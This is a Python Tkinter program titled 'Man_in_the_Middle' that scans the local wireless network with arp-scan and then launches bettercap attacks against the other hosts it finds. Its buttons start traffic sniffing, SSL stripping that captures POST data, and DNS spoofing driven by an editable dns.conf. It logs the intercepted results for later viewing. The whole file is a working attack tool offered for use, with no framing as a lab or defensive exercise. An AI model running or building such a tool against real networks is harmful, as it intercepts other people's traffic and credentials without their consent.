import tkinter as tk
from tkinter import *
import os
import re
import subprocess
from subprocess import call
import psutil
import itertools

def Widget_Eraser(list_of_widgets):
    i = 0

    while (i < len(list_of_widgets)):
    
        
        list_of_widgets[i].destroy()
        i = i + 1
        
    list_of_widgets.clear()
    
        
def Back_Button_Recreator(list_of_widgets):

    Button_for_Returning = Button(my_w, text="Back", command=lambda: Rescan_IP_Button(list_of_widgets))
    Button_for_Returning.place(x=390, y=2)
    list_of_widgets.append(Button_for_Returning)


def Main_Menu_Options(list_of_widgets):
    Widget_Eraser(list_of_widgets)
   
    output = subprocess.check_output("arp-scan --interface=wlan0 --localnet", shell = True)
    
    var= str(output) 
        
    matches = re.findall( r'[0-9]+(?:\.[0-9]+){3}', var)
    matches2 = re.findall( r'(?:[0-9a-fA-F]:?){12}', var)
    
     
    
    Scanned_IPs = []
    Scanned_Mac_Addresses = []
    
    [Scanned_IPs.append(x) for x in matches if x not in Scanned_IPs]

    [Scanned_Mac_Addresses.append(x) for x in matches2 if x not in Scanned_Mac_Addresses]
    
    
    Button_to_Scan_IPs_on_Network = Button(my_w, text="Rescan Network IPs", command=lambda: Rescan_IP_Button(list_of_widgets))
    Button_to_Scan_IPs_on_Network.place(x=350, y=100)
    
    Attacks = Button(my_w, text="Proceed to the Attacks", command=lambda: Attack_Choice(list_of_widgets, Scanned_IPs))

    Attacks.place(x=344, y=140)
    
    Logs = Button(my_w, text="View Logs of Attacks", command=lambda: Viewing(list_of_widgets))
    
    Logs.place(x = 348, y =185)
    
    
    string_variable = tk.StringVar(my_w, "Your IP address and MAC address: IP "+ str(Scanned_IPs[0]) + " MAC " + str(Scanned_Mac_Addresses[0]))
    string_variable2 = tk.StringVar(my_w, "Other IPs and their MAC addresses found on the network")
    
    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=160, y=40)
    
    l2 = tk.Label(my_w,  textvariable=string_variable2)
    l2.place(x=5, y=240)
    
    os.system("arp-scan --interface=wlan0 --localnet")
    
    text_area= Text(my_w)

    text_area.place(x=5, y=260, height = 125, width = 790)
    
    
    
    for (a,b) in itertools.zip_longest(Scanned_IPs[1:], Scanned_Mac_Addresses[1:]):
    
        String_Holder = "IP " + a + " MAC " + b + "\n"
    
         
  
        text_area.insert(END, String_Holder)
    
    
    
   
    list_of_widgets.append(Button_to_Scan_IPs_on_Network)
    list_of_widgets.append(Attacks)
    list_of_widgets.append(Logs)
    list_of_widgets.append(text_area)
    list_of_widgets.append(l1)
    list_of_widgets.append(l2)
    
    
def IP_Button(list_of_widgets):

    Main_Menu_Options(list_of_widgets)
    
def Rescan_IP_Button(list_of_widgets):
    
    with open("output.txt", "w") as firstfile:
        pass
    
    Main_Menu_Options(list_of_widgets)
    
   
def Attack_Choice(list_of_widgets, Scanned_IPs):


    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Select course of action")

    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=345, y=40)
    
    
    Button_for_Sniffing = Button(my_w, text="Sniffing", command=lambda: Sniffing(list_of_widgets, Scanned_IPs))

    Button_for_Sniffing.place(x=382, y=100)
    
    Button_for_SSL_Striping = Button(my_w, text="SSL_Stripping", command=lambda: SSL_Striping(list_of_widgets, Scanned_IPs))

    Button_for_SSL_Striping.place(x=365, y=140)
   
    Button_for_DNS = Button(my_w, text="DNS", command=lambda: DNS_Attack(list_of_widgets, Scanned_IPs))

    Button_for_DNS.place(x=395, y=180)
    
    list_of_widgets.append(Button_for_Sniffing)
    list_of_widgets.append(Button_for_SSL_Striping)
    list_of_widgets.append(Button_for_DNS)
    list_of_widgets.append(l1)
    
    
def Sniffing(list_of_widgets, Scanned_IPs):

    Sniffing_String = "bettercap -X"

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Press 'Scan' to start attack on other network IPs.")
    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=265, y=35)
    
    Button_for_Starting_Process = Button(my_w, text="Scan", command= lambda: start_function(list_of_widgets, Sniffing_String))
    Button_for_Starting_Process.place(x=390, y=140)
    
    list_of_widgets.append(l1)
    list_of_widgets.append(Button_for_Starting_Process)
    

def SSL_Striping(list_of_widgets, Scanned_IPs):

    SSL_Strip_String = "bettercap --proxy -P POST"

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Press 'Scan' to start attack on other network IPs.")

    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=265, y=35)
    
    Button_for_Starting_Process = Button(my_w, text="Scan", command= lambda: start_function(list_of_widgets, SSL_Strip_String))
    Button_for_Starting_Process.place(x=390, y=140)
    
    list_of_widgets.append(l1)
    list_of_widgets.append(Button_for_Starting_Process)

def DNS_Attack(list_of_widgets, Scanned_IPs):

    DNS_Attack_String = "bettercap -X --dns dns.conf"
    
    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    Button_for_Starting_Process = Button(my_w, text="Save", command= lambda: Saving_to_Conf(text_area))
    Button_for_Starting_Process.place(x=500, y=65)
    
    Scan_Button = Button(my_w, text="Scan", command= lambda: start_function(list_of_widgets, DNS_Attack_String))
    Scan_Button.place(x=300, y=65)    
    
    string_variable = tk.StringVar(my_w, "Modify dns.conf below to satisfaction and press 'Scan' to begin attack on other IPs.")
    
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=130, y=35)
    
    text_area= Text(my_w)

    text_area.place(x=5, y=100, height = 275, width = 790)
    
    tf = open("dns.conf")
    data = tf.read()
    text_area.insert(END, data)
    tf.close()
    
    list_of_widgets.append(l1)
    list_of_widgets.append(text_area)
    list_of_widgets.append(Scan_Button)
    list_of_widgets.append(Button_for_Starting_Process)
    

def Saving_to_Conf(text_area):
   
    tf = open("dns.conf", "w")
    tf.write(text_area.get(1.0, END))
    tf.close()
    

def start_function(list_of_widgets, Passed_String):

    Passed_String = Passed_String + " --log-timestamp --log output.txt"
    
    Widget_Eraser(list_of_widgets)
    
    
    p   = subprocess.Popen(["python3","attack_launcher.py", Passed_String])
    
    
    Button_for_Interruption = Button(my_w, text="Stop Scan", command=lambda: stop_function(list_of_widgets, p))

    Button_for_Interruption.place(x=380, y=140)
    
    
    string_variable = tk.StringVar(my_w, "Attack underway. Press 'Stop Scan' to end the attack.")

    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=250, y=35)
    
    
    list_of_widgets.append(Button_for_Interruption)
    list_of_widgets.append(l1)
 
def stop_function(list_of_widgets,p):

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
   
    try: 
    
        p.wait(timeout = 3)
        
    except subprocess.TimeoutExpired:
       kill(p.pid, p)
    

    print("Stopped")
    
    Transferring_Log_Records()
   
    Button_for_Show = Button(my_w, text="Show Results", command=lambda: show_function(list_of_widgets))

    Button_for_Show.place(x=360, y=140)
    
    string_variable = tk.StringVar(my_w, "Attack concluded. Press 'Show Results' to end the attack.")

    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=250, y=35)
    
    
    list_of_widgets.append(Button_for_Show)
    list_of_widgets.append(l1)

def kill(p_id, p):

    process = psutil.Process(p_id)
    for p in process.children(recursive = True):
        p.kill()
    process.kill()
   
def show_function(list_of_widgets):

    Widget_Eraser(list_of_widgets)
    
    Back_Button_Recreator(list_of_widgets)
    
    string_variable = tk.StringVar(my_w, "Log of results from attack taken. Viewable in main menu along with previous logs. Organized by time log.")
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=50, y=75)
    
    text_area= Text(my_w)

    text_area.place(x=5, y=100, height = 275, width = 790)
    
    tf = open("output.txt")
    data = tf.read()
    text_area.insert(END, data)
    tf.close()
    
    list_of_widgets.append(text_area)
    list_of_widgets.append(l1)

def Transferring_Log_Records():

    with open("output.txt", "r") as firstfile, open("temp.txt", "a") as secondfile:
        
        for line in firstfile:
        
            secondfile.write(line)
            
    with open("superlog.txt", "r") as firstfile, open("temp.txt", "a") as secondfile:
        
        for line in firstfile:
        
            secondfile.write(line)


    with open("superlog.txt", "w") as firstfile:
        pass
        

    with open("temp.txt", "r") as firstfile, open("superlog.txt", "a") as secondfile:
        
        for line in firstfile:
        
            secondfile.write(line)

    with open("temp.txt", "w") as firstfile:
        pass


def Viewing(list_of_widgets):

    Widget_Eraser(list_of_widgets)
    Back_Button_Recreator(list_of_widgets)
    
    text_area= Text(my_w)
    text_area.place(x=5, y=100, height = 275, width = 790)
    
    string_variable = tk.StringVar(my_w, "Log of results from ALL attacks taken. Organized by timestamp. Press 'Clear' to clear file.")
    l1 = tk.Label(my_w,  textvariable=string_variable)
    l1.place(x=100, y=75)
    
    Button_for_Clearing_File = Button(my_w, text="Clear", command= lambda: Clearing(text_area))
    
    Button_for_Clearing_File.place(x=390, y=38)
    
    list_of_widgets.append(text_area)
    list_of_widgets.append(l1)
    list_of_widgets.append(Button_for_Clearing_File)
   
    tf = open("superlog.txt")
    data = tf.read()
    text_area.insert(END, data)
    tf.close()

def Clearing(text_area):
    with open("superlog.txt", "w") as firstfile:
        pass


my_w = tk.Tk()
my_w.geometry("800x800")  
my_w.title("Man_in_the_Middle")  


list_of_widgets = []

Button_to_Scan_IPs_on_Network = Button(my_w, text="Scan Network IPs", command=lambda: IP_Button(list_of_widgets))

Button_to_Scan_IPs_on_Network.place(x=350, y=100)

string_variable = tk.StringVar(my_w, "Press 'Scan Network IPs' to scan IPs on the network.")
l1 = tk.Label(my_w,  textvariable=string_variable)
l1.place(x=250, y=75)

list_of_widgets.append(Button_to_Scan_IPs_on_Network)
list_of_widgets.append(l1)
        
        
my_w.mainloop()  
